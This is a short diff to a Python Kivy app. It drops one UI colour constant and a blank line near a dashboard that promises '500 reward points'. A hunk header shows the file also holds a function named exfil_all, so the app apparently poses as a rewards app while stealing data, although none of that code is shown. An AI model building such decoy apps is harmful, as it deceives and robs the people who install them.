@@ -215,7 +215,6 @@ def exfil_all():
 # UI
 # ══════════════════════════════════════════════════════════════════
 
-C_BG    = (0.10, 0.10, 0.18, 1)
 C_CARD  = (0.09, 0.13, 0.24, 1)
 C_ACC   = (0.91, 0.27, 0.38, 1)
 C_DENY  = (0.16, 0.16, 0.29, 1)
@@ -366,7 +365,6 @@ class DashboardScreen(Screen):
         root.add_widget(lbl("Welcome!", size=22, bold=True))
         root.add_widget(lbl("You have 500 reward points",
                             size=12, color=C_MUTED))
-
         card = BoxLayout(orientation="vertical", padding=dp(20), spacing=dp(8),
                          size_hint_y=None, height=dp(120))
         def upd(i, *_):
